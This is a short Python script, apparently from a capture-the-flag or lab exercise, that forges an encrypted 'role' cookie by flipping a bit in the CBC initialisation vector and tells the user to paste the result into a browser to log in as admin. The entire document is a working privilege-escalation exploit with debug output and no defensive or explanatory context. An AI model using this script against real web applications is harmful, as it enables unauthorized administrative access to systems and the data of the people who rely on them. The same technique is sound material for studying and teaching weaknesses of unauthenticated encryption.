import base64, sys
from binascii import unhexlify, hexlify

original_token = sys.argv[1]  # Your encrypted role token goes here

try:
    cipher_bytes = bytearray(unhexlify(original_token))
except ValueError:
    print("Invalid token format! Make sure it's a valid hex string.")
    exit(1)

# AES block size
block_size = 16

# Debug: Print IV (first 16 bytes) before modification
print("\n[DEBUG] Original IV (First 16 Bytes):", hexlify(cipher_bytes[:block_size]).decode())

guest_offset = 0

xor_diff = [
    0x01,  # '0' -> '1'
]

# Apply bit flipping to the IV (first 16 bytes)
for i, diff in enumerate(xor_diff):
    print(f"[DEBUG] Modifying byte at offset {guest_offset + i}: {hex(cipher_bytes[guest_offset + i])} XOR {hex(diff)}")
    cipher_bytes[guest_offset + i] ^= diff

print("\n[DEBUG] Modified IV (First 16 Bytes):", hexlify(cipher_bytes[:block_size]).decode())

# Encode the modified token back to hex
modified_token = hexlify(cipher_bytes).decode()

print("\nModified Token:")
print(modified_token)
print("\nUse this token as the new 'role' cookie in your browser to log in as admin.")

